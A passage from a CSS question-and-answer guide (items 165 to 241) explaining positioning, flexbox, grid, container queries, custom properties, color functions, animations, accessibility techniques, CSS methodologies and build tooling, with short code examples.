It's the padding box of the nearest ancestor that:

- has `position` other than `static`, **or**
- has `transform`, `translate`, `rotate`, `scale`, `perspective`, `filter`, `backdrop-filter`, `contain: layout` or `paint`, or `will-change` for one of those.

If none exists, it's the initial containing block (viewport sized, at the top of the document). For `position: fixed`, it's the viewport, unless one of those transform-like properties is on an ancestor.

### 166: Why might `position: sticky` not work?

Common reasons:

1. No offset is set (`top`, `bottom`, etc.).
2. An ancestor has `overflow: hidden`, `auto` or `scroll`, so the element sticks inside that ancestor instead of the page. Often that ancestor doesn't scroll, so nothing happens. `overflow: clip` doesn't cause this.
3. The parent is the same height as the sticky element, so there's no room to stick.
4. In a flex or grid container, the item is stretched to full height. Add `align-self: start`.
5. It's inside a `<table>` part that doesn't support it in some older browsers.

### 167: Why does a `position: fixed` modal scroll with the page?

An ancestor probably has `transform`, `filter`, `backdrop-filter`, `perspective`, `contain: paint`, or `will-change: transform`. Any of these makes that ancestor the containing block for fixed children, so "fixed" now means fixed to that ancestor.

Fix: move the modal to be a direct child of `body`, remove the property from the ancestor, or use `<dialog>` with `showModal()`. That puts it in the top layer, which isn't affected.

### 168: What is the difference between `flex-basis` and `width`?

`flex-basis` sets the starting size of a flex item along the main axis, before growing and shrinking. In a row it acts like width, and in a column like height. If both are set, `flex-basis` wins (unless it's `auto`, which then uses `width`).

`min-width` and `max-width` still limit the final size. `flex-basis: 0` with `flex-grow` gives equal sizes, while `flex-basis: auto` starts from the content size.

### 169: How do `flex-grow` and `flex-shrink` split the space?

**Growing:** the free space is shared in proportion to `flex-grow`. Free space is the container size minus the bases of all items.

```css
/* container 600px, items with basis 100px each = 300px free */
.a {
  flex: 1 1 100px;
} /* gets 100 + 100 = 200px */
.b {
  flex: 2 1 100px;
} /* gets 100 + 200 = 300px */
.c {
  flex: 0 1 100px;
} /* stays 100px */
```

**Shrinking:** the overflow is shared in proportion to `flex-shrink × flex-basis`. That way bigger items shrink more in pixels. No item shrinks below its minimum size (see `min-width: auto`).

### 170: Why does a flex item overflow instead of shrinking?

Flex items have `min-width: auto` by default. That means they can't get smaller than their content, like a long word, a wide table, or a `pre` block. Set `min-width: 0` (or `overflow: hidden`) on the item so it can shrink.

```css
.content {
  flex: 1;
  min-width: 0; /* now text-overflow: ellipsis inside it works */
}
```

In a column flex container, the same thing happens with `min-height`.

### 171: What is the difference between `align-items` and `align-content`?

- `align-items` aligns items **inside each line** on the cross axis.
- `align-content` aligns **the lines themselves** in the container. It only does something when there's more than one line (`flex-wrap: wrap`) and extra space on the cross axis.

In grid, `align-content` moves the whole grid inside the container when the tracks are smaller than the container. In newer browsers, `align-content` also works on normal block elements, so you can center content vertically with no flex or grid.

### 172: How does `margin: auto` work in a flex container?

Auto margins take all the free space on their side, before `justify-content` runs. It's a simple way to push one item away from the others.

```css
.nav {
  display: flex;
  gap: 1rem;
}
.nav .logout {
  margin-left: auto;
} /* pushed to the far right */
```

`margin: auto` on a single child centers it both ways.

### 173: How do you make a sticky footer layout?

The footer stays at the bottom when the content is short, and is pushed down when it's long.

```css
body {
  min-height: 100svh;
  display: grid;
  grid-template-rows: auto 1fr auto; /* header, main, footer */
}
```

Flexbox version:

```css
body {
  min-height: 100svh;
  display: flex;
  flex-direction: column;
}
main {
  flex: 1;
}
```

### 174: How do you build the "holy grail" layout?

A header, a footer, and three columns (left sidebar, main, right sidebar) that turn into one column on mobile.

```css
.layout {
  display: grid;
  min-height: 100svh;
  grid-template:
    "header" auto
    "main" 1fr
    "left" auto
    "right" auto
    "footer" auto / 1fr;
}

@media (width >= 900px) {
  .layout {
    grid-template:
      "header header header" auto
      "left   main   right" 1fr
      "footer footer footer" auto
      / 200px 1fr 200px;
  }
}

header {
  grid-area: header;
}
main {
  grid-area: main;
}
.left {
  grid-area: left;
}
.right {
  grid-area: right;
}
footer {
  grid-area: footer;
}
```

### 175: What is the difference between `auto-fill` and `auto-fit`?

Both create as many columns as fit. The difference shows when there are fewer items than columns:

- `auto-fill` keeps the empty columns, so items stay at their minimum size.
- `auto-fit` collapses the empty columns to zero, so the items stretch to fill the row.

```css
.grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(min(250px, 100%), 1fr));
  gap: 1rem;
}
```

`min(250px, 100%)` stops overflow when the container is narrower than 250px.

### 176: What is the implicit grid?

The explicit grid is the tracks you define with `grid-template-*`. When items are placed outside it, or there are more items than cells, the browser adds implicit tracks. Their size comes from `grid-auto-rows` and `grid-auto-columns`, which default to `auto`.

```css
.gallery {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  grid-auto-rows: 200px; /* every new row is 200px */
}
```

### 177: What does `grid-auto-flow: dense` do?

By default, grid places items in order and leaves holes when a big item doesn't fit. `dense` goes back and fills those holes with smaller items that come later.

```css
.gallery {
  grid-auto-flow: row dense;
}
```

The visual order no longer matches the HTML order, which can confuse keyboard users. Use it for image galleries, not for content where order matters.

### 178: How do named grid lines work?

You can name lines in the track list and place items by name.

```css
.page {
  display: grid;
  grid-template-columns:
    [full-start] 1fr
    [content-start] minmax(0, 60rem) [content-end]
    1fr [full-end];
}
.page > * {
  grid-column: content;
}
.page > .full-bleed {
  grid-column: full;
}
```

Lines named `x-start` and `x-end` create an implicit area called `x`. That's why `grid-column: content` works.

### 179: What is subgrid?

`subgrid` lets a nested grid use its parent's tracks instead of making its own. Items in different cards can then line up with each other.

```css
.cards {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
}
.card {
  display: grid;
  grid-row: span 3;
  grid-template-rows: subgrid; /* title, body and footer line up across cards */
}
```

It has been Baseline since 2023. The child also inherits the parent's line names and gaps, but it can set its own `gap`.

### 180: Why use `minmax(0, 1fr)` instead of `1fr`?

`1fr` really means `minmax(auto, 1fr)`. The `auto` minimum means a column can't shrink below its content's min-content width. A long URL or a wide code block can then make a "1fr" column wider than the others and cause overflow.

```css
grid-template-columns: repeat(3, minmax(0, 1fr)); /* truly equal columns */
```

### 181: What is the difference between `justify-items` and `justify-content` in grid?

- `justify-items` aligns each item **inside its own cell** along the inline axis.
- `justify-content` aligns **the whole grid** inside the container when the tracks don't fill it.

The same goes for `align-items` and `align-content` on the block axis. `justify-self` and `align-self` override alignment for one item.

### 182: How do you stack items on top of each other with grid?

Put them in the same cell. You don't need absolute positioning, and the container still grows to fit the bigger item.

```css
.hero {
  display: grid;
}
.hero > * {
  grid-area: 1 / 1;
}
.hero img {
  z-index: 0;
}
.hero .text {
  z-index: 1;
  align-self: end;
}
```

### 183: What are container queries?

Container queries change styles based on the size of a parent container instead of the viewport. A component can then adapt to wherever it's placed, like a sidebar or a main column.

```css
.card-wrapper {
  container-type: inline-size;
}

@container (width > 400px) {
  .card {
    display: grid;
    grid-template-columns: 150px 1fr;
  }
}
```

Size container queries have been Baseline since 2023.

### 184: What do the `container-type` values mean?

- `inline-size`: you can query the width (inline size). This is the one you'll use most.
- `size`: you can query width and height. The element must then have a height that doesn't depend on its children, or it collapses.
- `normal` (default): no size queries, but style queries (and scroll-state queries in Chromium) still work.

Setting `inline-size` or `size` adds size containment. The container's size can't depend on its children in that axis, which is what stops infinite loops.

### 185: What are container query units?

They are like viewport units, but relative to the nearest size container:

- `cqw` / `cqh`: 1% of the container's width / height.
- `cqi` / `cqb`: 1% of the inline / block size.
- `cqmin` / `cqmax`: the smaller / larger one.

```css
.card-wrapper {
  container-type: inline-size;
}
.card h2 {
  font-size: clamp(1rem, 5cqi, 2rem);
}
```

If there's no container, they fall back to the small viewport units.

### 186: How do you name a container and query a specific one?

```css
.sidebar {
  container-type: inline-size;
  container-name: sidebar;
  /* shorthand: container: sidebar / inline-size; */
}

@container sidebar (width < 300px) {
  .widget {
    font-size: 0.875rem;
  }
}
```

Without a name, `@container` queries the nearest ancestor container of any name.

### 187: What are container style queries?

They check the computed value of a custom property on the container, not its size.

```css
.card {
  --variant: default;
}
.card.featured {
  --variant: featured;
}

@container style(--variant: featured) {
  .card-title {
    color: gold;
  }
}
```

Every element is a style container by default, so no `container-type` is needed. Querying custom properties works in Chromium and Safari, and Firefox support has been in progress. Check current support before relying on it. Querying normal properties like `style(display: flex)` isn't supported anywhere yet.

### 188: What is the media query range syntax?

It lets you write comparisons instead of `min-` and `max-`.

```css
/* old */
@media (min-width: 600px) and (max-width: 899.98px) {
}

/* new */
@media (600px <= width < 900px) {
}
```

It's clearer and avoids the `899.98px` trick that prevented overlap at the boundary. It's Baseline since 2023 and also works in `@container`.

### 189: How do you make font sizes scale with the screen?

Use `clamp()` with a `rem` + viewport mix as the middle value.

```css
h1 {
  font-size: clamp(2rem, 1.5rem + 2.5vw, 3.5rem);
}
```

The `rem` part makes sure browser zoom still works. A value that only uses `vw` doesn't grow when the user zooms, which is an accessibility problem (WCAG 1.4.4). Tools like Utopia generate these values for a whole type scale.

### 190: How do you serve different background images for different screen densities?

Use `image-set()`:

```css
.hero {
  background-image: image-set(
    url("hero.avif") type("image/avif") 1x,
    url("hero@2x.avif") type("image/avif") 2x,
    url("hero.jpg") 1x
  );
}
```

The browser picks the best image for the screen's pixel density and skips formats it can't decode. For `<img>` elements, use `srcset` and `<picture>` in HTML.

### 191: How do you choose breakpoints?

Pick breakpoints where **your content** starts to look wrong, not at popular device widths. Start narrow, widen the browser, and add a breakpoint where the layout breaks. Most projects end up with 3-5 breakpoints. Keep them in one place, like Sass variables, design tokens or `@custom-media` if your build tool supports it. Plain custom properties can't be used inside media query conditions.

For components, container queries often replace page-level breakpoints.

### 192: What are the `hover` and `pointer` media features?

They describe the user's input device:

- `hover: hover`: the main input can hover (like a mouse).
- `hover: none`: it can't (like a touchscreen).
- `pointer: fine`: precise pointer (mouse). `pointer: coarse`: imprecise (finger).
- `any-hover` / `any-pointer`: whether **any** input device has that ability.

```css
@media (hover: hover) {
  .card:hover {
    transform: translateY(-4px);
  }
}
@media (pointer: coarse) {
  .button {
    min-height: 44px;
  }
}
```

This stops "sticky hover" on phones, where a tapped element stays in its hover state.

### 193: How do logical properties help with right-to-left languages?

When `dir="rtl"` is set, `inline-start` becomes the right side. If you write `margin-inline-start` instead of `margin-left`, the layout flips with no extra CSS.

```css
.icon {
  margin-inline-end: 0.5rem;
}
.quote {
  border-inline-start: 4px solid;
  padding-inline-start: 1rem;
}
.menu {
  inset-inline-end: 0;
}
```

Flexbox and grid already follow text direction. Mostly, you need to update spacing, borders, positioning and `text-align`.

### 194: What is the `:dir()` pseudo-class?

`:dir(rtl)` and `:dir(ltr)` match elements based on their text direction, including direction inherited from parents. `[dir="rtl"]` only matches the element that has the attribute.

```css
.arrow:dir(rtl) {
  transform: scaleX(-1);
}
```

It's Baseline since 2023.

### 195: What does `writing-mode` do?

It sets whether lines of text run horizontally or vertically, and which way blocks stack.

```css
.vertical-label {
  writing-mode: vertical-rl; /* top to bottom, lines go right to left */
}
.sideways {
  writing-mode: sideways-lr;
} /* newer, rotates the text */
```

It's used for Chinese and Japanese text, and for vertical labels on tables or charts. Logical properties follow `writing-mode`, so `inline-size` becomes the height in vertical mode.

### 196: How do custom properties work with the cascade and inheritance?

Custom properties are normal properties that inherit by default. You can set one on `:root` for global use, or on any element to override it for that part of the page.

```css
:root {
  --gap: 1rem;
}
.compact {
  --gap: 0.5rem;
}
.stack > * + * {
  margin-top: var(--gap);
}
```

Everything inside `.compact` gets the smaller gap. This makes them good for component variants and themes.

### 197: What is the difference between custom properties and Sass variables?

| Sass variables                                  | Custom properties                                 |
| ----------------------------------------------- | ------------------------------------------------- |
| Replaced at build time and gone from the output | Live in the browser                               |
| Can't change with media queries or JS           | Can change in media queries, on hover, or from JS |
| No cascade or inheritance                       | Follow the cascade and inherit                    |
| Work in selectors and media query conditions    | Only work in property values                      |

Many teams use both: Sass for build-time values like breakpoints, and custom properties for theme values that change at runtime.

### 198: How do you read and set custom properties from JavaScript?

```js
const root = document.documentElement;

// set
root.style.setProperty("--brand", "#e11d48");

// read the value that applies
const brand = getComputedStyle(root).getPropertyValue("--brand").trim();

// set on one element
card.style.setProperty("--progress", "75%");
```

A common pattern is passing mouse position or scroll progress to CSS with variables, and doing the visual work in CSS.

### 199: What is `@property`?

`@property` registers a custom property with a type, an initial value and an inheritance setting.

```css
@property --angle {
  syntax: "<angle>";
  inherits: false;
  initial-value: 0deg;
}
```

Because the browser knows its type, it can **animate** it, and invalid values fall back to `initial-value`. Without registration, custom properties are just strings and can't be animated smoothly. It's Baseline since mid-2024.

### 200: How do you animate a gradient?

Gradients can't be animated directly. You can animate a registered custom property that the gradient uses:

```css
@property --angle {
  syntax: "<angle>";
  inherits: false;
  initial-value: 0deg;
}

.border-glow {
  background: conic-gradient(from var(--angle), #4f46e5, #ec4899, #4f46e5);
  animation: rotate 3s linear infinite;
}

@keyframes rotate {
  to {
    --angle: 360deg;
  }
}
```

### 201: What does "invalid at computed-value time" mean?

When a `var()` gives a value that doesn't work for the property, the browser has already thrown away other declarations for that property during the cascade. So it can't fall back to an earlier rule. Instead, the property becomes `unset`: it inherits if it's an inherited property, otherwise it uses its initial value.

```css
:root {
  --size: red;
}
p {
  font-size: 20px;
  font-size: var(
    --size
  ); /* invalid, so font-size becomes unset (inherited), not 20px */
}
```

That's why fallbacks for custom properties work differently from normal fallbacks. Registering the property with `@property` makes it use its `initial-value` instead.

### 202: How do you build a theme system with custom properties?

Define semantic tokens once, then change their values for each theme.

```css
:root {
  --color-bg: #fff;
  --color-text: #111;
  --color-primary: #4f46e5;
}

[data-theme="dark"] {
  --color-bg: #0b0b0f;
  --color-text: #e5e5e5;
  --color-primary: #818cf8;
}

body {
  background: var(--color-bg);
  color: var(--color-text);
}
```

Components only use semantic names (`--color-primary`), never raw colors. Adding a new theme then means adding one block of overrides.

### 203: What do `color-scheme` and `light-dark()` do?

`color-scheme` tells the browser which color schemes the page supports. Browser UI like scrollbars, form controls and the default background then match. `light-dark()` picks one of two values based on the active scheme.

```css
:root {
  color-scheme: light dark;
}
body {
  background: light-dark(#ffffff, #121212);
  color: light-dark(#111111, #eeeeee);
}

/* force one theme for part of the page */
.always-dark {
  color-scheme: dark;
}
```

`light-dark()` is Baseline since 2024. It only works with colors (newer specs extend it to images). It follows the `color-scheme` of the element, so you can let users switch themes by changing `color-scheme` instead of copying all your variables.

### 204: What does `color-mix()` do?

It mixes two colors in a color space you choose.

```css
.button {
  --base: #4f46e5;
  background: var(--base);
}
.button:hover {
  background: color-mix(in oklch, var(--base), black 15%);
}
.subtle {
  background: color-mix(in srgb, var(--base) 20%, transparent);
}
```

It's an easy way to make hover states, tints and see-through versions from one base color, with no preprocessor.

### 205: What is relative color syntax?

It lets you take an existing color and change its channels.

```css
:root {
  --brand: #4f46e5;
}

.light {
  background: oklch(from var(--brand) calc(l + 0.2) c h);
}
.faded {
  background: rgb(from var(--brand) r g b / 50%);
}
.shift {
  background: hsl(from var(--brand) calc(h + 30) s l);
}
```

The `from` keyword breaks the color into channels (`l`, `c`, `h` or `r`, `g`, `b`), and you can use `calc()` on each one. It's in all major browsers since 2024.

### 206: Why is OKLCH popular for colors?

OKLCH (Lightness, Chroma, Hue) is "perceptually uniform". If two colors have the same `L` value, they look equally bright to people. In HSL that isn't true: yellow at 50% lightness looks much brighter than blue at 50%.

This makes it easier to build color scales, keep contrast predictable, and create shades by only changing `L`. OKLCH can also describe colors outside sRGB for wide-gamut screens. Tailwind v4 and many design systems now define their palettes in OKLCH.

### 207: How do you use wide-gamut colors?

Modern screens can show colors outside sRGB (Display P3). You can use them with `color(display-p3 ...)` or `oklch()`, and keep a fallback for older screens.

```css
.cta {
  background: #ff3366;
}
@media (color-gamut: p3) {
  .cta {
    background: color(display-p3 1 0.15 0.4);
  }
}
```

If a screen can't show a color, the browser maps it to the nearest color it can show.

### 208: How do you animate an element to and from `display: none`?

Use `transition-behavior: allow-discrete` (or `allow-discrete` in the `transition` shorthand) and `@starting-style` for the starting values when the element appears.

```css
.toast {
  opacity: 1;
  translate: 0 0;
  transition:
    opacity 300ms,
    translate 300ms,
    display 300ms allow-discrete;
}

.toast[hidden] {
  display: none;
  opacity: 0;
  translate: 0 1rem;
}

@starting-style {
  .toast {
    opacity: 0;
    translate: 0 1rem;
  }
}
```

`allow-discrete` keeps the element visible (`display: block`) until the exit transition ends. `@starting-style` gives the "before" values for the first frame after it appears. For popovers and dialogs, also transition `overlay` with `allow-discrete` so they stay in the top layer while they animate out.

### 209: How do you animate to `height: auto`?

The traditional way is a grid trick, which works everywhere:

```css
.panel {
  display: grid;
  grid-template-rows: 0fr;
  transition: grid-template-rows 300ms;
}
.panel.open {
  grid-template-rows: 1fr;
}
.panel > .inner {
  overflow: hidden;
}
```

The newer way is `interpolate-size: allow-keywords`, which lets the browser animate between a length and `auto`. Right now it only works in Chromium browsers. Others just jump with no animation, which is a fine fallback.

```css
:root {
  interpolate-size: allow-keywords;
}
details::details-content {
  height: 0;
  overflow: clip;
  transition:
    height 300ms,
    content-visibility 300ms allow-discrete;
}
details[open]::details-content {
  height: auto;
}
```

### 210: What does `animation-fill-mode` do?

It decides what styles apply before the animation starts and after it ends.

- `none`: the keyframe styles only apply while the animation runs.
- `forwards`: keeps the last keyframe after it ends.
- `backwards`: applies the first keyframe during `animation-delay`.
- `both`: does both.

```css
.fade-in {
  opacity: 0;
  animation: fade 500ms 200ms forwards;
}
@keyframes fade {
  to {
    opacity: 1;
  }
}
```

### 211: How do you pause or reverse an animation with CSS?

```css
.spinner {
  animation: spin 1s linear infinite;
}
.spinner:hover {
  animation-play-state: paused;
}

.pulse {
  animation: pulse 1s ease-in-out infinite alternate;
}
```

`animation-direction: alternate` plays forward, then backward. `reverse` always plays backward. To restart an animation from JavaScript, remove the animation, force a reflow, and set it again. Or use the Web Animations API, which has `play()`, `pause()` and `reverse()`.

### 212: What are `cubic-bezier()`, `steps()` and `linear()`?

They are timing functions.

```css
.a {
  transition-timing-function: cubic-bezier(0.34, 1.56, 0.64, 1);
} /* overshoot */
.b {
  animation-timing-function: steps(8);
} /* sprite sheet, 8 frames */
.c {
  transition-timing-function: linear(0, 0.6 20%, 1.1 50%, 0.95 70%, 1);
} /* bounce-ish */
```

- `cubic-bezier()` sets a curve with two control points. Values above 1 overshoot.
- `steps()` jumps between values with no smoothing.
- `linear()` (Baseline 2023) draws a curve from many points, which makes spring and bounce effects possible in pure CSS.

### 213: Which properties are cheap to animate?

`transform` (and `translate`, `rotate`, `scale`) and `opacity`. Browsers can animate them on the compositor, often on the GPU, without doing layout or paint again for each frame. `filter` is often fine too.

Animating `width`, `height`, `top`, `left`, `margin` or `padding` triggers layout on every frame. `background-color`, `box-shadow` and `color` trigger repaint. Those can drop frames, especially on weak phones.

```css
/* bad */
.panel {
  transition: left 300ms;
}
/* good */
.panel {
  transition: transform 300ms;
}
```

### 214: What are the individual transform properties?

`translate`, `rotate` and `scale` are separate properties. You can change one without overwriting the others.

```css
.card {
  translate: 0 0;
  scale: 1;
  transition:
    translate 200ms,
    scale 200ms;
}
.card:hover {
  translate: 0 -4px;
}
.card:active {
  scale: 0.98;
} /* hover translate stays */
```

They are applied in a fixed order: `translate`, then `rotate`, then `scale`, then the `transform` property.

### 215: Why does the order of transform functions matter?

Each function changes the coordinate system for the ones after it.

```css
.a {
  transform: translateX(100px) rotate(45deg);
} /* moves right, then rotates in place */
.b {
  transform: rotate(45deg) translateX(100px);
} /* rotates, then moves along the rotated axis (diagonally) */
```

`transform-origin` sets the point that rotate and scale use. The default is the center: `transform-origin: top left;` rotates around the corner.

### 216: How do 3D transforms work?

You need `perspective` for depth, either on the parent or as a function.

```css
.scene {
  perspective: 800px;
}
.card {
  transform-style: preserve-3d;
  transition: transform 600ms;
}
.scene:hover .card {
  transform: rotateY(180deg);
}
.card .back {
  transform: rotateY(180deg);
  backface-visibility: hidden;
}
.card .front {
  backface-visibility: hidden;
}
```

A smaller `perspective` value gives a stronger 3D effect. `preserve-3d` lets children keep their 3D position instead of being flattened.

### 217: What is `will-change` and when should you use it?

`will-change` tells the browser that a property is going to change, so it can prepare, usually by giving the element its own compositor layer.

```css
.drawer {
  will-change: transform;
}
```

Use it only on a few elements that you know will animate, and ideally add it just before the animation and remove it after. Putting it on many elements uses a lot of GPU memory and can make things slower. It also creates a stacking context and a containing block for fixed children.

### 218: How does scroll snapping work?

```css
.carousel {
  display: flex;
  overflow-x: auto;
  scroll-snap-type: x mandatory;
  scroll-padding-inline: 1rem;
}
.carousel > .slide {
  flex: 0 0 80%;
  scroll-snap-align: center;
  scroll-snap-stop: always; /* don't skip past slides on a fast swipe */
}
```

`mandatory` always snaps to a point. `proximity` only snaps when the scroll stops close to one. It gives you a carousel with no JavaScript.

### 219: What does `overscroll-behavior` do?

It controls what happens when you reach the end of a scroll area. By default, scrolling "chains" to the parent, so scrolling past the end of a modal starts scrolling the page behind it.

```css
.modal-body {
  overscroll-behavior: contain;
} /* no chaining */
body {
  overscroll-behavior-y: none;
} /* also no pull-to-refresh or bounce */
```

### 220: How do you stop a fixed header from covering anchor targets?

Use `scroll-margin-top` on the targets or `scroll-padding-top` on the scroll container.

```css
html {
  scroll-padding-top: 80px;
} /* height of the sticky header */

/* or per element */
h2[id] {
  scroll-margin-top: 80px;
}
```

These offsets also work for focus scrolling and `scrollIntoView()`.

### 221: How do you style scrollbars?

The standard properties:

```css
.panel {
  scrollbar-width: thin; /* auto, thin, none */
  scrollbar-color: #888 transparent; /* thumb track */
  scrollbar-gutter: stable; /* reserve space so layout doesn't jump */
}
```

The old `::-webkit-scrollbar` pseudo-elements still work in Safari and in Chromium when the standard properties aren't set. They give more control, but they're non-standard. `scrollbar-width: none` hides the scrollbar but keeps scrolling, so make sure users can still tell the area scrolls.

### 222: How do you make a table header stick when you scroll?

```css
.table-wrapper {
  max-height: 400px;
  overflow: auto;
}
thead th {
  position: sticky;
  top: 0;
  background: white; /* otherwise rows show through */
  z-index: 1;
}
/* sticky first column */
tbody th {
  position: sticky;
  left: 0;
  background: white;
}
```

Put `position: sticky` on the `th` cells, not on `thead` or `tr`, for the best browser support.

### 223: How do you hide something visually but keep it for screen readers?

Use a "visually hidden" class:

```css
.sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip-path: inset(50%);
  white-space: nowrap;
  border: 0;
}
```

`display: none` and `visibility: hidden` hide it from screen readers too. Use this for things like labels on icon buttons or a "skip to content" link. That link usually becomes visible on `:focus`.

### 224: How do you write good focus styles?

```css
:focus-visible {
  outline: 3px solid #4f46e5;
  outline-offset: 2px;
}
:focus:not(:focus-visible) {
  outline: none;
} /* rarely needed now */
```

Rules of thumb:

- Never remove outlines without putting something visible in their place.
- Make sure the focus ring has enough contrast with the background (WCAG asks for 3:1).
- An outline is better than `box-shadow`. Windows High Contrast (forced colors) mode removes shadows but keeps outlines.
- `:focus-within` can highlight a whole form group when any field inside it has focus.

### 225: What is forced colors mode?

It's an accessibility mode (like Windows High Contrast) where the OS replaces your colors with a small user-chosen palette. Backgrounds, borders and text get system colors. Shadows and background images may be removed.

```css
@media (forced-colors: active) {
  .button {
    border: 1px solid ButtonText; /* make sure the button has an edge */
  }
  .icon {
    forced-color-adjust: auto;
  }
}
```

Test it in DevTools by emulating forced colors. Common bugs are buttons with no visible border and focus states made only with `box-shadow`.

### 226: How do you handle `prefers-reduced-motion` properly?

There are two approaches:

```css
/* opt-out: animate by default, tone down when asked */
@media (prefers-reduced-motion: reduce) {
  .hero {
    animation: none;
  }
}

/* opt-in: only animate when the user hasn't asked for less motion */
@media (prefers-reduced-motion: no-preference) {
  .hero {
    animation: slide-in 600ms ease-out;
  }
}
```

The opt-in version is safer, because new animations don't run by accident. Swap big movements for fades instead of removing all feedback. In JavaScript, check `matchMedia("(prefers-reduced-motion: reduce)")`.

### 227: Is content from `::before` and `::after` read by screen readers?

Yes, most screen readers read generated `content`. So don't put important information only in CSS content, and don't use decorative characters without care. You can give alternative text after a slash:

```css
.new::before {
  content: "★" / "New"; /* read as "New" */
}
.decoration::after {
  content: "→" / ""; /* not read at all */
}
```

Generated content can't be selected or copied, and it disappears if CSS fails to load.

### 228: What is BEM?

BEM (Block, Element, Modifier) is a class naming convention:

```css
.card {
} /* block */
.card__title {
} /* element: part of the block */
.card__button {
}
.card--featured {
} /* modifier: a variant */
.card__button--disabled {
}
```

Everything is a single class, so specificity stays flat and low. Class names show where the styles live and what they belong to, which helps on big teams. The downsides are long class names, and nested elements can get awkward.

### 229: What are OOCSS, SMACSS and ITCSS?

They are older but still used ways to organise CSS:

- **OOCSS** (Object-Oriented CSS): keep structure separate from skin, and container separate from content. Build reusable "objects" like `.media`.
- **SMACSS**: sort rules into base, layout, module, state and theme.
- **ITCSS** (Inverted Triangle): order styles from generic and low specificity (settings, tools, generic, elements) to specific (objects, components, utilities).

Cascade layers now give native support for the ITCSS idea of ordering styles by how specific they are.

### 230: What is utility-first CSS?

You style with many small single-purpose classes (`flex`, `p-4`, `text-sm`) instead of writing a component class for each thing. Tailwind CSS is the main example.

Pros: no naming, CSS stops growing after a point, changes stay local, and design constraints come from the scale. Cons: long class lists in markup, a learning curve, and you need components (in React, Vue, etc.) to avoid repeating the same class lists.

### 231: What are CSS Modules?

CSS Modules is a build-time feature where every class name in a `.module.css` file is made unique per file. Styles can't leak or clash.

```css
/* Button.module.css */
.button {
  padding: 0.5rem 1rem;
}
.primary {
  background: royalblue;
}
```

```jsx
import styles from "./Button.module.css";

export function Button({ children }) {
  return (
    <button className={`${styles.button} ${styles.primary}`}>{children}</button>
  );
}
```

It's plain CSS with local scope, and it's supported out of the box by Vite, Next.js and most bundlers.

### 232: What are the pros and cons of CSS-in-JS?

CSS-in-JS (styled-components, Emotion) writes styles in JavaScript next to components.

**Pros:** scoped styles, dynamic styles based on props, styles live next to the component, and unused styles go away with the component.

**Cons (runtime libraries):** style work at runtime adds JavaScript and slows rendering. It also plays badly with React Server Components and streaming, which is why many teams have moved away from it.

**Zero-runtime** options (vanilla-extract, Linaria, Panda CSS, StyleX) keep the authoring style but output static CSS at build time.

### 233: How does Shadow DOM isolate styles?

Styles inside a shadow root only apply inside it, and outside styles don't reach in. There are a few exceptions:

- **Inherited properties** (like `color` and `font-family`) still inherit through the shadow boundary.
- **Custom properties** also inherit, which makes them the main way to theme web components.
- `::part()` and `::slotted()` let outside and inside styles reach specific nodes.

This is why web components are usually themed with CSS variables.

### 234: What do `:host`, `::slotted()` and `::part()` do?

```css
/* inside the component's shadow root */
:host {
  display: block;
  border: 1px solid;
}
:host([variant="primary"]) {
  border-color: blue;
}
:host(:hover) {
  background: #f5f5f5;
}
::slotted(p) {
  margin: 0;
} /* only top-level slotted elements */
```

```css
/* outside, in page CSS */
my-card::part(title) {
  font-size: 1.5rem;
}
```

```html
<!-- in the shadow template -->
<h2 part="title"><slot name="title"></slot></h2>
```

`::part()` is how a component decides which internal parts the page is allowed to style.

### 235: What is `@scope`?

`@scope` limits styles to a part of the DOM, with an optional lower limit.

```css
@scope (.card) {
  img {
    border-radius: 8px;
  }
  :scope {
    padding: 1rem;
  } /* the .card itself */
}

/* "donut" scope: stop at .content */
@scope (.tabs) to (.tab-content) {
  a {
    color: inherit;
  }
}
```

It also adds **scoping proximity** to the cascade: when two scoped rules have the same specificity, the one whose scope root is closer to the element wins. It's in Chromium and Safari, and Firefox shipped it more recently. Check support before you depend on it.

### 236: Which Sass features do teams use most?

```scss
@use "sass:math";
@use "tokens" as t;

$breakpoint-md: 768px;

@mixin respond($bp) {
  @media (min-width: $bp) {
    @content;
  }
}

.card {
  padding: t.$space-4;
  width: math.div(100%, 3);

  &__title {
    font-size: 1.25rem;
  } // .card__title (string joining)

  @include respond($breakpoint-md) {
    padding: t.$space-6;
  }
}

%visually-hidden {
  position: absolute;
  clip-path: inset(50%);
}
.sr-only {
  @extend %visually-hidden;
}
```

Variables, mixins, partials with `@use`, BEM string joining with `&__`, functions and loops are the main reasons people still use Sass.

### 237: What is the difference between `@use` and `@import` in Sass?

`@import` in Sass is deprecated and will be removed in Dart Sass 3.0. Its problems: every import put all variables into one global scope, the same file could be included many times, and it was hard to tell where a variable came from.

`@use` loads a file once, gives it a namespace, and keeps private members (names that start with `-` or `_`) private.

```scss
@use "colors"; // colors.$primary
@use "spacing" as s; // s.$md
@forward "buttons"; // re-export from an index file
```

Sass ships a migrator tool (`sass-migrator module`) for moving old code over.

### 238: What do PostCSS and Lightning CSS do in a build?

They take your CSS and transform it:

- Add vendor prefixes based on your `browserslist`.
- Turn modern syntax (nesting, `oklch()`, media range syntax) into code older browsers understand.
- Bundle `@import`s and minify.
- Handle CSS Modules.

Lightning CSS is written in Rust and does most of this in one fast tool. Vite can use it, and Tailwind v4 uses it internally. PostCSS is the plugin-based JavaScript option with a large ecosystem.

### 239: What is `@supports`?

`@supports` applies styles only if the browser supports a property and value, or a selector.

```css
.layout {
  display: flex;
  flex-wrap: wrap;
}

@supports (display: grid) {
  .layout {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
  }
}

@supports not (backdrop-filter: blur(1px)) {
  .glass {
    background: rgb(255 255 255 / 90%);
  }
}

@supports selector(:has(a)) {
  .card:has(img) {
    padding: 0;
  }
}
```

### 240: What is progressive enhancement in CSS?

You write a baseline that works everywhere, then add features for browsers that support them. CSS makes this easy because browsers ignore what they don't understand.

```css
.card {
  background: #4f46e5; /* everyone */
  background: oklch(55% 0.2 270); /* modern browsers */
}
.cards {
  display: flex;
  flex-wrap: wrap;
}
@supports (grid-template-rows: subgrid) {
  .cards {
    display: grid; /* ... */
  }
}
```

The page doesn't need to look the same in every browser. It needs to work in every browser.

### 241: What does `font-display` do?

It controls what happens while a web font is loading.

- `swap`: show the fallback font right away, then swap when the web font loads. Text is never hidden.
- `block`: hide text for up to about 3 seconds, then show the fallback.
